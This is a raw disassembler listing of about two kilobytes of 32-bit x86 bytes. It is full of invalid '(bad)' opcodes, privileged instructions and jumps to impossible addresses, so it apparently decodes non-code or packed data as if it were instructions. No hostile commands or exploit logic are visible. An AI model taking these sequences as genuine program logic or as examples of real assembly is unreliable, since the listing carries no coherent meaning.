  422f4d:	mov    esi,0x2ba442c7
  422f52:	add    DWORD PTR [eax],eax
  422f54:	hlt    
  422f55:	ret    
  422f56:	(bad)  
  422f57:	push   edi
  422f58:	xchg   ebx,eax
  422f59:	data16 test BYTE PTR [edi+0x16227fb],bh
	...
  422f78:	add    ah,dh
  422f7a:	stos   DWORD PTR es:[edi],eax
  422f7b:	lea    eax,[edx-0x7c]
  422f7e:	fisttp DWORD PTR [edx+eax*4-0x36078e0]
  422f85:	(bad)  
  422f86:	cli    
  422f87:	sub    edi,ebp
  422f89:	arpl   WORD PTR [ebx-0x67a4ab00],bp
  422f8f:	test   al,0xfc
  422f91:	jmp    0xf4822519
  422f96:	add    al,0x72
  422f98:	xchg   ebx,eax
  422f99:	jp     0x422faa
  422f9b:	xor    ebx,esp
  422f9d:	inc    esp
  422f9e:	add    eax,0x4f48b65
  422fa3:	out    0x84,eax
  422fa5:	sub    esi,edi
  422fa7:	cmc    
  422fa8:	test   DWORD PTR [ebx-0x6dfc18fe],edx
  422fae:	mov    DWORD PTR [ebx-0x11],ebp
  422fb1:	adc    BYTE PTR [ebp+0x7fc3292d],dl
  422fb7:	cli    
  422fb8:	lahf   
  422fb9:	add    BYTE PTR [ebp+0x29f86ed],dl
  422fbf:	out    0x3,eax
  422fc1:	pop    edx
  422fc2:	mov    BYTE PTR [esi],cl
  422fc4:	add    eax,0x86720367
  422fc9:	or     edx,DWORD PTR [ecx-0x75e36003]
  422fcf:	mov    dh,0xa0
  422fd1:	rcl    BYTE PTR [ecx+eax*1-0x2177ae04],1
  422fd8:	test   DWORD PTR [esi-0x10],0xf450
	...
  422ff3:	add    BYTE PTR [eax],al
  422ff5:	add    BYTE PTR [esi-0x76],ch
  422ff8:	sbb    bl,BYTE PTR [edi-0x6ea46b50]
  422ffe:	setno  ch
  423001:	lahf   
  423002:	fwait
  423003:	and    BYTE PTR [ebp-0x59760bfc],0xf
  42300a:	ja     0x422ff8
  42300c:	call   0x25c72414
  423011:	add    dh,ah
  423013:	add    esp,DWORD PTR [ecx+eax*1-0xa]
  423017:	add    al,0xe7
  423019:	and    eax,0x88ddf42b
  42301e:	pop    es
  42301f:	pop    es
  423020:	out    0x3,eax
  423022:	sub    esi,DWORD PTR [edx]
  423024:	sbb    DWORD PTR [ecx],0x26
  423027:	xchg   esp,eax
  423028:	(bad)  
  423029:	sti    
  42302a:	addr16 jg 0x422faf
  42302d:	mov    ebp,0xb9fc916a
  423032:	xchg   DWORD PTR fs:[ebx+0x4f915b5c],edx
  423039:	inc    ecx
  42303a:	inc    edx
  42303b:	retf   0xe8ff
  42303e:	rol    DWORD PTR [ebp-0x6eaaa246],1
  423044:	cld    
  423045:	(bad)  
  423046:	cld    
  423047:	add    BYTE PTR [edi-0x3717bac],al
  42304d:	cs jns 0x4230bf
  423050:	xchg   edi,eax
  423051:	and    al,0x63
  423053:	xchg   ecx,eax
  423054:	mov    BYTE PTR [edi+eiz*2+0xd428b],ah
	...
  423073:	and    BYTE PTR [ebp+0x7ff7e8ff],al
  423079:	adc    ch,0x82
  42307c:	nop
  42307d:	cld    
  42307e:	call   0xd3c9:0x99129227
  423085:	(bad)  
  423086:	frstor [ecx]
  423088:	dec    ecx
  423089:	add    DWORD PTR [edx-0x45],ebp
  42308c:	inc    DWORD PTR [edi-0x12]
  42308f:	jae    0x423028
  423091:	(bad)  
  423092:	call   0x558a6d8e
  423097:	into   
  423098:	dec    ebx
  423099:	or     eax,0xfc93486c
  42309e:	jmp    0xe657c219
  4230a3:	sub    DWORD PTR [ebx-0x2],0x151ef7e8
  4230aa:	inc    ecx
  4230ab:	fimul  DWORD PTR [ebx-0x6fa5327e]
  4230b1:	cld    
  4230b2:	add    ebp,DWORD PTR [eax+0x7e]
  4230b5:	inc    esp
  4230b6:	in     eax,0x27
  4230b8:	add    BYTE PTR [edx-0x48d5f00],0xff
  4230bf:	std    
  4230c0:	retf   
  4230c1:	inc    ecx
  4230c2:	lock sub DWORD PTR [edi],eax
  4230c5:	add    BYTE PTR [eax],al
  4230c7:	jne    0x423096
  4230c9:	lds    eax,FWORD PTR [eax]
  4230cb:	dec    ebp
  4230cc:	fst    QWORD PTR [ebx]
  4230ce:	jmp    0x423884
  4230d3:	xchg   edi,eax
  4230d4:	dec    edx
  4230d5:	add    al,0x84
	...
  4230ef:	add    ch,bl
  4230f1:	add    al,BYTE PTR [ebx+esi*2+0xf00070c]
  4230f8:	mov    ds:0x224889c7,eax
  4230fd:	scas   al,BYTE PTR es:[edi]
  4230fe:	in     eax,dx
  4230ff:	bts    esp,ebx
  423102:	cld    
  423103:	dec    DWORD PTR ds:0x104f88d7
  423109:	fmul   DWORD PTR [eax-0x48d8e73]
  42310f:	jmp    FWORD PTR [esi+ebx*2+0x6cdc625]
  423116:	mov    BYTE PTR [eax+edx*8-0x350006e6],0x7
  42311e:	mov    DWORD PTR [eax-0x30],ebx
  423121:	mov    bh,0xbc
  423123:	lea    ecx,[eax]
  423125:	mov    ch,0x4d
  423127:	push   eax
  423128:	std    
  423129:	jge    0x42316c
  42312b:	int3   
  42312c:	sbb    BYTE PTR [edx+0x70bafc90],cl
  423132:	dec    esp
  423133:	inc    eax
  423135:	pop    edx
  423136:	adc    DWORD PTR [eax-0x73],eax
  423139:	mov    edi,DWORD PTR [edi+ecx*1-0x261e0]
  423140:	popf   
  423141:	mov    ah,0xce
  423143:	xor    esp,DWORD PTR [ebx+0x7c]
  423146:	inc    ecx
  423147:	int3   
  423148:	xchg   esi,eax
  423149:	enter  0x1370,0xf4
  42314d:	stos   BYTE PTR es:[edi],al
  42314e:	push   edx
  42314f:	leave  
  423150:	jg     0x423142
  423152:	mov    WORD PTR [edi+0x0],?
	...
  42316c:	add    BYTE PTR ds:0x77407d4,bl
  423172:	pop    ss
  423173:	inc    esp
  423174:	sbb    al,0xf
  423176:	bound  edx,QWORD PTR [esp+esi*8]
  423179:	dec    edx
  42317a:	pop    esi
  42317b:	cmp    ecx,0xfffffff6
  42317e:	lods   eax,DWORD PTR ds:[esi]
  42317f:	mov    ebx,0x9c3be6
  423184:	add    BYTE PTR [edi+0x64],bh
  423187:	lock dec esi
  423189:	jge    0x4231fc
  42318b:	nop
  42318c:	cld    
  42318d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42318e:	mov    ds:0xd2c8828d,eax
  423193:	call   0xf4c2:0x5e43a4fc
  42319a:	fwait
  42319b:	and    al,BYTE PTR [ecx-0x36447bf]
  4231a1:	sti    
  4231a2:	call   0xfd48:0x307d0c15
  4231a9:	jmp    0x4231ad
  4231ab:	mov    DWORD PTR [edx-0x364f4dc],esi
  4231b1:	fistp  DWORD PTR [eax]
  4231b3:	int    0xfc
  4231b5:	jmp    0xf4822481
  4231ba:	push   es
  4231bb:	jmp    0x42313d
  4231bd:	ret    0xb95
  4231c0:	mov    ?,WORD PTR [ebx-0x65]
  4231c3:	add    BYTE PTR [eax],al
  4231c5:	push   ds
  4231c6:	sahf   
  4231c7:	cmp    BYTE PTR [esi+0x7d],ah
  4231ca:	sub    ch,ch
  4231cc:	cld    
  4231cd:	mov    ds:0x426ca,eax
	...
  4231ea:	imul   ebp,edx,0x20815007
  4231f0:	sar    esp,1
  4231f2:	mov    esp,DWORD PTR [edx+0x30]
  4231f5:	lds    edi,FWORD PTR [ecx]
  4231f7:	add    eax,0x917bf397
  4231fc:	out    0xab,al
  4231fe:	loop   0x4231c7
  423200:	out    0x3,al
  423202:	fdivp  st(4),st
  423204:	xor    DWORD PTR [esi],esp
  423206:	ins    DWORD PTR es:[edi],dx
  423207:	or     dh,ah
  423209:	xor    BYTE PTR [esi+eax*1],0x6a
  42320d:	push   ds
  42320e:	pusha  
  42320f:	xchg   ecx,eax
  423210:	or     al,0x8b
  423212:	jbe    0x4231f6
  423214:	ins    DWORD PTR es:[edi],dx
  423215:	pushf  
  423216:	inc    eax
  423217:	pop    ss
  423218:	mov    esp,0xe704742b
  42321d:	add    edi,DWORD PTR [edi-0x79]
  423220:	cli    
  423221:	sahf   
  423222:	sub    BYTE PTR [ecx-0x6e3bfc40],dl
  423228:	(bad)  [ebx]
  42322a:	add    al,BYTE PTR [ebp-0x19]
  42322d:	and    eax,0x9d02877d
  423232:	or     BYTE PTR [ecx-0x789753c],dl
  423238:	and    ebx,DWORD PTR [eax+edi*8+0x74c35600]
  42323f:	leave  
  423240:	loop   0x4231d0
  423242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423243:	stc    
  423244:	or     ebx,DWORD PTR [eax+eiz*8-0x2c405482]
  42324b:	xchg   DWORD PTR [eax+0x9c],esp
	...
  423265:	add    BYTE PTR [eax],al
  423267:	sar    BYTE PTR [esi-0x55],1
  42326a:	scas   eax,DWORD PTR es:[edi]
  42326b:	je     0x4231fa
  42326d:	in     eax,dx
  42326e:	or     edi,DWORD PTR [eax+0x33]
  423271:	call   0xa7162679
  423276:	xchg   DWORD PTR [esi],ebp
  423278:	mov    cl,0xfd
  42327a:	or     al,BYTE PTR [edi-0x3c78e13b]
  423280:	add    DWORD PTR [edx-0x3c],ebp
  423283:	in     eax,dx
  423284:	jge    0x4232a9
  423286:	mov    ah,0xca
  423288:	xor    DWORD PTR [eax],eax
  42328a:	popf   
  42328b:	out    dx,al
  42328c:	fisttp QWORD PTR [esi+esi*2]
  42328f:	jne    0x42326d
  423291:	cld    
  423292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423293:	pop    edi
  423294:	xlat   BYTE PTR ds:[ebx]
  423295:	inc    edx
  423296:	mov    ebp,0x1cfcf205
  42329b:	cmp    BYTE PTR [ebx-0x7e],0xbd
  42329f:	jle    0x423232
  4232a1:	cld    
  4232a2:	sbb    DWORD PTR [ebx+0x43],ebp
  4232a5:	aam    0x13
  4232a7:	clc    
  4232a8:	ffree  st(0)
  4232aa:	sbb    DWORD PTR [ebp+0x4],edi
  4232ad:	sbb    eax,0xec135f19
  4232b2:	inc    bp
  4232b4:	mov    al,0x12
  4232b6:	test   eax,0x457a85f7
  4232bb:	pop    DWORD PTR [ecx]
  4232bd:	test   BYTE PTR [edi+0x460004f8],cl
  4232c3:	add    eax,0x4648aa1
  4232c8:	xchg   edx,eax
  4232c9:	cld    
  4232ca:	add    BYTE PTR ss:[eax],al
	...
  4232e1:	add    BYTE PTR [eax],al
  4232e3:	add    BYTE PTR [eax+0x3],bl
  4232e6:	push   esi
  4232e7:	cs pop edi
  4232e9:	test   BYTE PTR [edi-0x98840a],bh
  4232ef:	call   0x39b4b0eb
  4232f4:	jge    0x423338
  4232f6:	lock mov ecx,0x62b826c
  4232fc:	jg     0x42328e
  4232fe:	dec    edi
  4232ff:	mov    edx,0xf6b83492
  423304:	outs   dx,BYTE PTR ds:[esi]
  423305:	(bad)  
  423306:	cld    
  423307:	ret    0x3fb5
  42330a:	mov    ebp,ebp
  42330c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42330d:	aas    
  42330e:	std    
  42330f:	push   esp
  423310:	pop    esp
  423311:	nop
  423312:	adc    al,cl
  423314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423315:	iret   
  423316:	call   DWORD PTR [ecx]
  423318:	mov    ebx,0xa2000c10
  42331d:	xor    cl,BYTE PTR [edx-0x495add4]
  423323:	cmp    eax,edx
  423325:	dec    esp
  423326:	jno    0x42339c
  423328:	jle    0x4232ea
  42332a:	bound  ecx,QWORD PTR [ecx+0x24b7b82]
  423330:	sti    
  423331:	xchg   DWORD PTR [ecx-0x4957dd4],edi
  423337:	pop    ss
  423338:	inc    edx
  423339:	adc    al,0xbe
  42333b:	(bad)  
  42333c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42333d:	sbb    ebp,0x3
  423340:	ror    eax,cl
  423342:	jg     0x4233c1
  423344:	popa   
  423345:	xchg   edx,eax
  423346:	test   BYTE PTR [edi+0x0],cl
	...
  423361:	dec    esi
  423362:	hlt    
  423363:	or     DWORD PTR [edx+0x3d],ebp
  423366:	jl     0x4232f1
  423368:	xor    al,0xd2
  42336a:	push   0xfffffffb
  42336c:	jmp    0x423381
  42336e:	xchg   BYTE PTR [ecx-0x24],bh
  423371:	pmuludq mm7,QWORD PTR [edx+ebp*2]
  423375:	or     DWORD PTR [ecx+ecx*4+0x30],edi
  423379:	shr    BYTE PTR [edx-0x5],cl
  42337c:	push   ecx
  42337d:	nop
  42337e:	cmp    al,BYTE PTR [ecx+edx*2]
  423381:	mov    ch,0xb1
  423383:	rol    BYTE PTR [eax],0xd
  423386:	loope  0x423389
  423388:	lea    esp,[eax-0x64]
  42338b:	sti    
  42338c:	inc    DWORD PTR [edx]
  42338e:	(bad)  [eax+0x4d6cca4c]
  423394:	call   0x3e8243
  423399:	sar    dh,cl
  42339b:	jecxz  0x42332a
  42339d:	push   eax
  42339e:	push   ds
  42339f:	cli    
  4233a0:	call   edx
  4233a2:	ror    BYTE PTR [esi+0x3],cl
  4233a5:	mov    ebx,ecx
  4233a7:	push   edx
  4233a8:	dec    DWORD PTR [eax+0x61]
  4233ab:	sti    
  4233ac:	adc    eax,0x3fecbbf4
  4233b1:	hlt    
  4233b2:	ret    0x3105
  4233b5:	mov    edi,0xc7ec3d13
  4233ba:	push   esp
  4233bb:	xor    bh,0x8b
  4233be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233bf:	ins    DWORD PTR es:[edi],dx
  4233c0:	mov    esi,0xfde4296d
	...
  4233dd:	add    BYTE PTR [ebx+0x67],bh
  4233e0:	cmp    BYTE PTR [esi+0x138514f6],0x6a
  4233e7:	ja     0x42337f
  4233e9:	mov    BYTE PTR [ecx-0x375765d],dh
  4233ef:	test   DWORD PTR [esi-0x541e8004],edx
  4233f5:	xchg   BYTE PTR [ecx-0x48],bh
  4233f8:	xchg   esi,eax
  4233f9:	cld    
  4233fa:	inc    ebx
  4233fb:	jmp    0x42342f
  4233fd:	push   ecx
  4233fe:	imul   esp,DWORD PTR [ecx],0x2f33fdf0
  423404:	xor    al,0x51
  423406:	sub    edx,DWORD PTR [ecx-0x644bed50]
  42340c:	jge    0x4233cd
  42340e:	jmp    0x423426
  423410:	or     esp,edi
  423412:	adc    ecx,edi
  423414:	mov    dh,BYTE PTR [edx+0x18]
  423417:	inc    esp
  423418:	push   cs
  423419:	push   edi
  42341a:	add    ebx,edi
  42341c:	stos   BYTE PTR es:[edi],al
  42341d:	or     eax,0x7296e477
  423422:	cli    
  423423:	in     eax,0x3c
  423425:	cmc    
  423426:	cmc    
  423427:	add    al,BYTE PTR [ebx]
  423429:	mov    BYTE PTR [ecx-0xd],al
  42342c:	cs call 0x460f7a
  423432:	jg     0x42344c
  423434:	test   eax,0x9bc1e6
  423439:	add    BYTE PTR [edx-0x33017098],bh
  42343f:	add    al,0xd8
  423441:	add    eax,DWORD PTR [eax]
	...
  42345b:	hlt    
  42345c:	add    al,0x1a
  42345e:	les    edx,FWORD PTR [ecx]
  423460:	adc    BYTE PTR [ecx+esi*8],0x19
  423464:	jl     0x42348a
  423466:	push   es
  423467:	daa    
  423468:	add    BYTE PTR [ecx-0xc],dl
  42346b:	jle    0x4234b3
  42346d:	out    dx,eax
  42346e:	xor    ebx,DWORD PTR [ebx+ecx*8-0x660bfc56]
  423475:	jmp    0x724b4e04
  42347a:	rcr    DWORD PTR [ebx+0x4c],0x34
  42347e:	cdq    
  42347f:	push   0xe68a9679
  423484:	mov    ah,0x69
  423486:	cdq    
  423487:	pop    eax
  423488:	std    
  423489:	push   0x7f
  42348b:	push   ebx
  42348c:	(bad)  
  42348d:	out    0x98,al
  42348f:	(bad)  
  423490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423491:	sbb    DWORD PTR [edx],esi
  423493:	test   eax,0x3891769c
  423498:	lea    esi,[ecx-0x65]
  42349b:	je     0x42342a
  42349d:	out    0xe,eax
  42349f:	mov    ebp,0xc40bab7f
  4234a4:	jg     0x423449
  4234a6:	mov    bl,0xab
  4234a8:	pushf  
  4234a9:	leave  
  4234aa:	cmp    edx,DWORD PTR [ecx]
  4234ac:	lea    esi,[ecx+0xe]
  4234af:	and    al,0x79
  4234b1:	mov    bh,BYTE PTR cs:[esi-0x48]
  4234b5:	and    DWORD PTR ds:[ebx-0xf7bda73],0x6e928c
	...
  4234d8:	inc    eax
  4234d9:	popf   
  4234da:	in     al,0x15
  4234dc:	hlt    
  4234dd:	add    al,0x62
  4234df:	ds aam 0x88
  4234e2:	cs add eax,0x98963824
  4234e8:	inc    esi
  4234e9:	std    
  4234ea:	inc    DWORD PTR [eax]
  4234ec:	sub    BYTE PTR [edx-0x6b901104],dl
  4234f2:	and    dh,0xf9
  4234f5:	pop    ss
  4234f6:	or     esi,ebx
  4234f8:	add    eax,0xf03488b1
  4234fd:	pushf  
  4234fe:	scas   al,BYTE PTR es:[edi]
  4234ff:	aaa    
  423500:	or     DWORD PTR [ecx-0x5bbbc378],0x4f
  423507:	and    DWORD PTR [ebx-0x77],esp
  42350a:	xor    BYTE PTR [esi+0x1283f96b],0x63
  423511:	mov    esp,edi
  423513:	push   0xffffff8b
  423515:	mov    esi,DWORD PTR [eax+0x39]
  423518:	stos   BYTE PTR es:[edi],al
  423519:	inc    edi
  42351a:	stc    
  42351b:	jmp    0x8fcb73ae
  423520:	mov    ch,dl
  423522:	push   edx
  423523:	xchg   BYTE PTR [ebx+0x7d],ch
  423526:	out    dx,eax
  423527:	push   0x62
  423529:	mov    DWORD PTR [edx-0x11],esi
  42352c:	add    DWORD PTR [edi-0xb],0x55d28ee4
  423533:	push   ecx
  423534:	lds    ebx,FWORD PTR [edx]
  423536:	add    cl,ch
  423538:	adc    BYTE PTR [edi],0xe0
  42353b:	mov    edx,0x0
	...
  423554:	add    cl,dl
  423556:	mov    DWORD PTR [edx-0x1f],esi
  423559:	dec    edi
  42355a:	sub    dh,dh
  42355c:	inc    esi
  42355d:	imul   eax,DWORD PTR [ebp-0x21b1709],0xffffff88
  423564:	xchg   esp,eax
  423565:	out    dx,eax
  423566:	xor    ch,al
  423568:	leave  
  423569:	leave  
  42356a:	mov    esp,edi
  42356c:	adc    bh,dl
  42356e:	test   edi,esi
  423570:	push   ds
  423571:	add    eax,0x72acc603
  423576:	mov    ch,cl
  423578:	jmp    0x76e5:0xf92e6f
  42357f:	push   ebx
  423580:	dec    edx
  423582:	jb     0x4235f5
  423584:	fdiv   st,st(5)
  423586:	out    0xc1,al
  423588:	add    ch,cl
  42358a:	jge    0x4235cd
  42358c:	sti    
  42358d:	fld    DWORD PTR [ecx]
  42358f:	or     eax,DWORD PTR [ebp-0x497ac]
  423595:	or     eax,0xba00f2ed
  42359a:	or     ebp,DWORD PTR [ecx+edi*8+0x75fb72ba]
  4235a1:	mov    ebp,0x37f77172
  4235a6:	je     0x4235a3
  4235a8:	jne    0x42353f
  4235aa:	pop    edi
  4235ab:	or     dh,dh
  4235ad:	call   0xbd14:0x5ac08172
  4235b4:	jmp    0x3d9e99
	...
  4235d1:	add    BYTE PTR [eax],ah
  4235d3:	sub    al,0x83
  4235d6:	imul   esp,DWORD PTR [edi+0x72597d7f],0x44c33b70
  4235e0:	adc    al,0x2
  4235e2:	cwde   
  4235e3:	inc    esp
  4235e4:	cld    
  4235e5:	push   eax
  4235e6:	test   al,0x44
  4235e8:	in     al,0x50
  4235ea:	retf   0xbf4
  4235ed:	(bad)  
  4235ee:	push   eax
  4235ef:	jae    0x4235fd
  4235f1:	add    BYTE PTR ds:0xba0f7407,cl
  4235f7:	xchg   esp,eax
  4235f8:	call   0x81499312
  4235fd:	rol    BYTE PTR [ecx-0x4],0x7e
  423601:	enter  0x5eca,0x3b
  423605:	push   eax
  423607:	push   0x11
  423609:	inc    eax
  42360a:	fstp   QWORD PTR [edi-0x15]
  42360d:	mov    esi,esp
  42360f:	pop    eax
  423610:	test   al,0x86
  423612:	xor    esp,esi
  423614:	sbb    cl,BYTE PTR [ecx+0x5a9fa39]
  42361a:	ja     0x42359d
  42361c:	cwde   
  42361d:	inc    DWORD PTR [esi]
  42361f:	fcomp  QWORD PTR [edx]
  423621:	xchg   DWORD PTR [ecx],esi
  423623:	xchg   edx,eax
  423624:	xchg   DWORD PTR [edx+0x4],eax
  423627:	adc    al,0x3d
  423629:	repz push ds
  42362b:	xchg   esp,eax
  42362c:	test   DWORD PTR [edx-0x58],eax
  42362f:	int3   
  423630:	xchg   edx,eax
  423631:	jb     0x42361f
  423633:	popa   
  423634:	cmp    al,0xf4
	...
  42364e:	add    ah,dh
  423650:	mov    bl,0xd1
  423652:	push   ebx
  423653:	mov    ecx,DWORD PTR [ebx-0x32]
  423656:	(bad)  
  423657:	js     0x4236b5
  423659:	add    dl,BYTE PTR [ebx-0x393ed84b]
  42365f:	mov    WORD PTR ss:[eax],es
  423662:	push   ebx
  423663:	jg     0x4236dd
  423665:	sub    bl,0x1c
  423668:	popf   
  423669:	add    BYTE PTR [eax],al
  42366b:	(bad)  
  42366c:	es xor eax,0x2eeaaa08
  423672:	call   0x462d10
  423677:	pop    es
  423678:	xlat   BYTE PTR gs:[ebx]
  42367a:	add    ebx,ebp
  42367c:	das    
  42367d:	shl    DWORD PTR [eax],0x2a
  423680:	dec    edx
  423681:	es add eax,0x4f9c6179
  423687:	outs   dx,DWORD PTR ds:[esi]
  423688:	aaa    
  423689:	mov    DWORD PTR [edx+0x8],ecx
  42368c:	inc    esp
  42368d:	fcom   QWORD PTR [eax+0x13]
  423690:	inc    ebx
  423691:	cmp    BYTE PTR [edi-0x4031657f],0xd
  423698:	jp     0x42369a
  42369a:	add    ah,dh
  42369c:	sbb    edx,DWORD PTR ds:0x9b04f4f9
  4236a2:	out    dx,eax
  4236a3:	jl     0x423632
  4236a5:	mov    ah,0x29
  4236a7:	jecxz  0x423721
  4236a9:	stos   DWORD PTR es:[edi],eax
  4236aa:	cwde   
  4236ab:	sub    ebx,DWORD PTR [ebp-0x762ecf11]
  4236b1:	push   0xffffffc4
	...
  4236cb:	add    BYTE PTR [esi-0x63],al
  4236ce:	adc    DWORD PTR [ebp-0x76f1c894],esi
  4236d4:	jp     0x4236b5
  4236d6:	out    0x3,al
  4236d8:	mov    cl,0x4
  4236da:	jb     0x42368e
  4236dc:	push   0xffffff9e
  4236de:	test   BYTE PTR [eax],0xb6
  4236e1:	jge    0x42369a
  4236e3:	adc    BYTE PTR [ebp-0xbfc31fc],0xc3
  4236ea:	(bad)  
  4236eb:	repz cld 
  4236ed:	mov    bl,0xa7
  4236ef:	stos   DWORD PTR es:[edi],eax
  4236f0:	sti    
  4236f1:	ret    
  4236f2:	enter  0xed0b,0xc6
  4236f6:	push   ds
  4236f7:	mov    esi,0xd74091b6
  4236fc:	imul   eax,DWORD PTR [edi+eiz*8],0x6a81f103
  423703:	add    esi,esp
  423705:	add    al,0x1
  423707:	add    al,0xde
  423709:	add    esi,DWORD PTR [esi+edi*1+0x4d]
  42370d:	xor    al,0x72
  42370f:	cwde   
  423710:	pop    ebx
  423711:	mov    edx,0x80389518
  423716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423717:	jp     0x73dae29b
  42371d:	adc    BYTE PTR [ebx],0xc8
  423720:	and    DWORD PTR [ecx+0x105b7f55],ecx
  423726:	fnstsw WORD PTR ds:0x3458a93
  42372c:	hlt    
  42372d:	add    al,0xbd
  42372f:	lods   eax,DWORD PTR ds:[esi]
	...
  423748:	add    BYTE PTR [edx],bl
  42374a:	push   cs
  42374b:	add    BYTE PTR [esi],dh
  42374d:	pusha  
  42374e:	mov    BYTE PTR [edx+0x313887a4],cl
  423754:	sbb    BYTE PTR es:[edx],dh
  423757:	mov    esp,DWORD PTR [ebx+edi*4-0x76]
  42375b:	cld    
  42375c:	push   ss
  42375d:	daa    
  42375e:	cmp    BYTE PTR [edx+0x19],0x68
  423762:	repz rcr esp,cl
  423765:	aaa    
  423766:	add    eax,0xfef32983
  42376b:	lds    ebp,FWORD PTR [eax+ebp*2+0x7cbae92d]
  423772:	adc    esi,eax
  423774:	shr    BYTE PTR [ecx-0x61a827b],cl
  42377a:	adc    BYTE PTR [edi],al
  42377c:	(bad)  
  42377d:	(bad)  
  42377e:	call   0x96300dbb
  423783:	call   0x18844263
  423788:	push   ebx
  423789:	in     al,dx
  42378a:	test   DWORD PTR [edi+0x427bc7ed],edi
  423790:	(bad)  
  423791:	sub    BYTE PTR [ebp+0x4f0a9f7],bl
  423797:	std    
  423798:	adc    al,0x88
  42379a:	mov    DWORD PTR [edx],edx
  42379c:	lds    ebx,FWORD PTR [ebp-0x38]
  42379f:	call   ecx
  4237a1:	outs   dx,BYTE PTR ds:[esi]
  4237a2:	adc    al,0xc5
  4237a4:	imul   esp,ebp,0xada75991
  4237aa:	(bad)  
  4237ab:	(bad)  
  4237ac:	in     eax,0x0
	...
  4237c6:	ins    BYTE PTR es:[edi],dx
  4237c7:	(bad)  
  4237c9:	call   0x745252c5
  4237ce:	mov    ebp,0xe7e969b4
  4237d3:	mov    DWORD PTR [edx],edx
  4237d5:	mov    ecx,0x69ffc81d
  4237da:	cmp    al,0xfc
  4237dc:	imul   eax,DWORD PTR [eax],0x8965dc1f
  4237e2:	pop    eax
  4237e3:	push   esp
  4237e4:	or     esi,DWORD PTR [esi+0xf446048]
  4237ea:	pop    ecx
  4237eb:	sub    ebp,edi
  4237ed:	(bad)  
  4237ee:	(bad)  
  4237f0:	jae    0x4237fb
  4237f2:	sbb    edi,DWORD PTR [esi]
  4237f4:	repz pop ebx
  4237f6:	hlt    
  4237f7:	je     0x4237f5
  4237f9:	(bad)  
  4237fa:	fld    QWORD PTR [ecx+eax*2+0x4f66e5d0]
  423801:	inc    edx
  423803:	push   es
  423804:	in     eax,dx
  423805:	mov    DWORD PTR [eax],edi
  423807:	je     0x423888
  423809:	(bad)  
  42380a:	mov    ds:0x48ffe0ef,al
  42380f:	gs pop dx
  423812:	jmp    0x4237e3
  423814:	out    0x21,eax
  423816:	ret    
  423817:	jb     0x423814
  423819:	mov    esp,DWORD PTR [ebp-0x37fe0482]
  42381f:	retf   0x4588
  423822:	test   ebx,edx
  423824:	mov    BYTE PTR [ebp+0x3d],al
  423827:	shl    edi,cl
  423829:	cwde   
	...
  423842:	add    BYTE PTR [eax],cl
  423844:	je     0x423841
  423846:	mov    ecx,DWORD PTR [eax]
  423848:	jno    0x4237d1
  42384a:	clc    
  42384b:	in     al,0xf4
  42384d:	fucomip st,st(0)
  42384f:	(bad)  
  423850:	int3   
  423851:	cli    
  423852:	(bad)  
  423853:	fidiv  WORD PTR [edx-0x5]
  423856:	jne    0x423899
  423858:	push   es
  423859:	pop    edx
  42385a:	or     BYTE PTR [ebx+0x745bf33c],bl
  423860:	daa    
  423861:	std    
  423862:	call   FWORD PTR ds:0x4237e7ca
  423868:	add    eax,DWORD PTR [eax]
  42386a:	mov    ebx,DWORD PTR [eax+0x67]
  42386d:	xchg   DWORD PTR [ebp-0xc],ebx
  423870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423871:	test   edi,eax
  423873:	test   BYTE PTR [ebp+0x1a],0x5a
  423877:	mov    ds:0x1d5986a,eax
  42387c:	(bad)  
  42387d:	xchg   ecx,eax
  42387e:	mov    ah,bh
  423880:	sbb    DWORD PTR [edx-0x6e5b9702],edx
  423886:	jb     0x42385c
  423888:	hlt    
  423889:	lods   eax,DWORD PTR ds:[esi]
  42388a:	push   eax
  42388b:	jecxz  0x423874
  42388d:	jge    0x423901
  42388f:	aam    0x4
  423891:	or     edx,DWORD PTR [ebx-0x2d]
  423894:	test   DWORD PTR [ebp-0x7b703404],0x8e87c36d
  42389e:	cmp    BYTE PTR [ebx-0x45fbeb63],0x61
  4238a5:	(bad)  
  4238a6:	inc    DWORD PTR [eax]
	...
  4238c0:	jge    0x42389b
  4238c2:	mov    bl,BYTE PTR [edx+eax*2+0x43]
  4238c6:	mov    ecx,0x269bf0c1
  4238cb:	mov    DWORD PTR [ecx],edi
  4238cd:	shr    DWORD PTR [ecx],0x87
  4238d0:	xor    DWORD PTR [edx+0x7a],ebp
  4238d3:	inc    edx
  4238d4:	fwait
  4238d5:	sbb    DWORD PTR ds:0xb7d96dd0,ecx
  4238db:	out    0xba,eax
  4238dd:	jmp    0x6cc23570
  4238e2:	cmp    ch,0x63
  4238e5:	xchg   edi,eax
  4238e6:	test   BYTE PTR [ecx],bh
  4238e8:	pop    ebx
  4238e9:	outs   dx,DWORD PTR ds:[esi]
  4238ea:	mov    ss,WORD PTR [ebp+0x5c]
  4238ed:	bound  esp,QWORD PTR [ecx]
  4238ef:	add    ah,dh
  4238f1:	jle    0x423907
  4238f3:	in     al,dx
  4238f4:	into   
  4238f5:	loope  0x423930
  4238f7:	push   ecx
  4238f8:	dec    esp
  4238f9:	mov    WORD PTR [ebp-0x73e4cc04],cs
  4238ff:	(bad)  
  423900:	mov    al,ds:0xc39ef04
  423905:	or     al,0xba
  423907:	nop
  423908:	sbb    BYTE PTR [edx-0x79f47b1b],bl
  42390e:	ror    DWORD PTR [ecx],cl
  423910:	xor    al,BYTE PTR [eax+0x3e]
  423913:	sub    eax,0x4725010d
  423918:	std    
  423919:	add    al,0x3f
  42391b:	inc    BYTE PTR [esi-0x7a]
  42391e:	sub    eax,0xe78a6e84
  423923:	push   ss
	...
  42393c:	add    BYTE PTR [eax+0x3d989b84],al
  423942:	adc    DWORD PTR [ebp-0x6f],edi
  423945:	inc    esi
  423946:	cdq    
  423947:	or     eax,0x61ac117
  42394c:	xor    eax,0x90fbcfcc
  423951:	mov    eax,0x8701267f
  423956:	les    eax,FWORD PTR [ecx]
  423958:	mov    BYTE PTR [esi+0x7a],al
  42395b:	shl    BYTE PTR [eiz*8-0x23c6cb57],cl
